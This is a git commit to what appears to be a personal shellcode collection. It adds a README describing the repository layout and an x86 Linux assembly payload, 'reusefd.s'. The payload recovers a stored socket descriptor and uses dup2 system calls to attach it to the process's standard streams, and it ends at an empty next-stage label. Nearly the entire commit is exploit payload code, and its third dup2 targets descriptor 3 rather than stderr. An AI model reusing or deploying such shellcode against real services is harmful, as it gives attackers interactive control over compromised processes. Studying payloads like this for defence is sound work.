862090f3103f41136b74beaf1641c4145b0bfbed
ubuntu-32 <electra@ubuntu.(none)>
2013-10-21 13:50:10 -0700

    added x86 linux reusefd

--- README.md
+++ README.md
@@ -1,2 +1,16 @@
 my shellcode
+============
 
+shellcode is in the shellcode directory.  the higherarchy is:
+
+```
+shellcode
+	[arch]
+		[os]
+			[optimization stratagy]
+				src/ assembly source
+				obj/ object files of source
+				elf/ assembled elfs
+				bin/ .text segment of elfs
+				py/  python code of string containing .text segment
+```
---
+++ shellcode/x86/linux/unoptimized/src/reusefd.s
@@ -0,0 +1,34 @@
+.section .text
+.global _start
+
+_start:
+    jmp end
+begin:
+    popl %esi
+    mov (%esi), %edi
+
+dup2:
+    mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
+    mov %edi, %ebx #int olddf
+    mov $0x00, %ecx #int newfd
+    int $0x80
+
+    mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
+    mov %edi, %ebx #int olddf
+    mov $0x01, %ecx #int newfd
+    int $0x80
+
+    mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
+    mov %edi, %ebx #int olddf
+    mov $0x03, %ecx #int newfd
+    int $0x80
+
+    jmp next_stage
+
+end:
+    call begin
+
+fd:
+.long 5
+
+next_stage:
